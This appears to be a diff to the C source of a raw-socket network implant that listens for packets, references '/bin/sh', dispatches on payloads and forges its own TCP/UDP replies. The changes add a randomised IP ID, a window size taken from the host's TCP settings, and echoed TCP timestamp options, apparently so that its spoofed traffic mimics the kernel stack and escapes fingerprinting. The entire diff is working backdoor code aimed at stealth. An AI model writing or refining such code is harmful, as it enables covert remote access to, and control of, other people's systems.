@@ -16,8 +16,27 @@
 
 static int sockfd;
 static const char _sh[] = "/bin/sh";
+static uint16_t tcp_window = 509;
+static uint16_t ip_id_counter;
 
-// populated at startup from getifaddrs() 
+static uint16_t next_ip_id(void) {
+    return ++ip_id_counter;
+}
+
+static void compute_tcp_window(void) {
+    int def = 0, max = 0;
+    FILE *f = fopen("/proc/sys/net/ipv4/tcp_rmem", "r");
+    if (!f) return;
+    if (fscanf(f, "%*d %d %d", &def, &max) != 2) { fclose(f); return; }
+    fclose(f);
+    int w = 0, s = max;
+    while (s > 65535 && w < 14) { s >>= 1; w++; }
+    int aligned = (def / 2 / 1448) * 1448;
+    if (w > 0 && aligned > 0)
+        tcp_window = aligned >> w;
+}
+
+// populated at startup from getifaddrs()
 #define MAX_LOCAL_IPS 32
 static uint32_t local_ips[MAX_LOCAL_IPS];
 static int      local_ip_count = 0;
@@ -62,7 +81,8 @@ struct __attribute__((__packed__)) tcpframe {
     struct ethhdr  ehdr;
     struct iphdr   ip;
     struct tcphdr  tcp;
-    char data[ETH_DATA_LEN - sizeof(struct tcphdr) - sizeof(struct iphdr)];
+    char tcp_opts[12];
+    char data[ETH_DATA_LEN - sizeof(struct tcphdr) - 12 - sizeof(struct iphdr)];
 };
 
 static void ip_checksum(struct iphdr *ip) {
@@ -94,7 +114,7 @@ static void send_reply(unsigned char *buf, int ifindex,
     frame.ip.version  = 4;
     frame.ip.ihl      = 5;
     frame.ip.ttl      = 64;
-    frame.ip.id       = htons(69);
+    frame.ip.id       = htons(next_ip_id());
     frame.ip.frag_off = htons(IP_DF);
     frame.ip.protocol = IPPROTO_UDP;
     frame.ip.tot_len  = htons(20 + 8 + msglen);
@@ -142,6 +162,29 @@ static uint16_t tcp_checksum(struct iphdr *ip, struct tcphdr *tcp,
     return (unsigned short)~sum;
 }
 
+static void extract_tcp_ts(unsigned char *buf, uint32_t *tsval, uint32_t *tsecr) {
+    struct iphdr *ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
+    unsigned char *tcp_start = buf + sizeof(struct ethhdr) + ip->ihl * 4;
+    int tcp_hlen = (tcp_start[12] >> 4) * 4;
+    *tsval = 0;
+    *tsecr = 0;
+    int pos = 20;
+    while (pos < tcp_hlen) {
+        unsigned char kind = tcp_start[pos];
+        if (kind == 0) break;
+        if (kind == 1) { pos++; continue; }
+        if (pos + 1 >= tcp_hlen) break;
+        unsigned char len = tcp_start[pos + 1];
+        if (len < 2 || pos + len > tcp_hlen) break;
+        if (kind == 8 && len == 10) {
+            *tsval = ntohl(*(uint32_t *)(tcp_start + pos + 2));
+            *tsecr = ntohl(*(uint32_t *)(tcp_start + pos + 6));
+            return;
+        }
+        pos += len;
+    }
+}
+
 static void send_tcp_reply(unsigned char *buf, int ifindex,
                            uint16_t sport, uint16_t dport,
                            uint32_t *seq, uint32_t ack,
@@ -161,34 +204,46 @@ static void send_tcp_reply(unsigned char *buf, int ifindex,
     frame.ip.version  = 4;
     frame.ip.ihl      = 5;
     frame.ip.ttl      = 64;
-    frame.ip.id       = htons(69);
+    frame.ip.id       = htons(next_ip_id());
     frame.ip.frag_off = htons(IP_DF);
     frame.ip.protocol = IPPROTO_TCP;
-    frame.ip.tot_len  = htons(20 + 20 + msglen);
+    frame.ip.tot_len  = htons(20 + 32 + msglen);
     frame.ip.saddr    = orig_ip->daddr;
     frame.ip.daddr    = orig_ip->saddr;
     ip_checksum(&frame.ip);
+
+    uint32_t in_tsval, in_tsecr;
+    extract_tcp_ts(buf, &in_tsval, &in_tsecr);
+    uint32_t reply_tsval = htonl(in_tsecr + 1);
+    uint32_t reply_tsecr = htonl(in_tsval);
 
     frame.tcp.source  = dport;
     frame.tcp.dest    = sport;
     frame.tcp.seq     = htonl(*seq);
     frame.tcp.ack_seq = htonl(ack);
-    frame.tcp.doff    = 5;
+    frame.tcp.doff    = 8;
     frame.tcp.psh     = 1;
     frame.tcp.ack     = 1;
-    frame.tcp.window  = htons(65535);
+    frame.tcp.window  = htons(tcp_window);
     frame.tcp.check   = 0;
+
+    frame.tcp_opts[0] = 1;
+    frame.tcp_opts[1] = 1;
+    frame.tcp_opts[2] = 8;
+    frame.tcp_opts[3] = 10;
+    memcpy(frame.tcp_opts + 4, &reply_tsval, 4);
+    memcpy(frame.tcp_opts + 8, &reply_tsecr, 4);
 
     memcpy(frame.data, msg, msglen);
 
-    frame.tcp.check = tcp_checksum(&frame.ip, &frame.tcp, msg, msglen);
+    frame.tcp.check = tcp_checksum(&frame.ip, &frame.tcp, frame.tcp_opts, 12 + msglen);
 
     sa.sll_family  = PF_PACKET;
     sa.sll_ifindex = ifindex;
     sa.sll_halen   = ETH_ALEN;
     memcpy(sa.sll_addr, orig_eth->h_source, ETH_ALEN);
 
-    int total = sizeof(struct ethhdr) + 20 + 20 + msglen;
+    int total = sizeof(struct ethhdr) + 20 + 32 + msglen;
     sendto(sockfd, &frame, total, 0, (struct sockaddr *)&sa, sizeof(sa));
 
     *seq += msglen;
@@ -368,6 +423,8 @@ static void dispatch(char *payload, int payload_len, unsigned char *buf,
 }
 
 int main(void) {
+    ip_id_counter = rand();
+    compute_tcp_window();
     enumerate_local_ips();
 
     sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
